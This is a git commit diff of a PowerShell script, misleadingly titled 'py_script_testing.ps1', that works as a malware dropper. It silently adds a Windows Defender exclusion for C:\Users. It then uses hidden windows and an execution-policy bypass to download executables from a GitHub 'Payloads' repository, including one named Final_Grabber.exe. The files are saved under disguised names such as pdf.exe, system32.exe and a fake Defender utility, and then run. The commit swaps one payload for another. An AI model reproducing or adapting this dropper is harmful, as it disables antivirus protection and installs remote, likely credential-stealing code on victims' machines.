f2e622c38645f116089a78726745faa52d391088
rude90 <115774095+rude90@users.noreply.github.com>
2023-09-27 16:19:27 +0500

    Update py_script_testing.ps1

--- py_script_testing.ps1
+++ py_script_testing.ps1
@@ -7,8 +7,8 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf.exe
 powershell.exe -w Hidden C:\Users\pdf.exe
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/x5.0.exe -o C:\Users\Chrome.exe
-powershell.exe -w Hidden C:\Users\Chrome.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/NAZPAT.exe -o C:\Users\system32.exe
+powershell.exe -w Hidden C:\Users\system32.exe
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
 powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
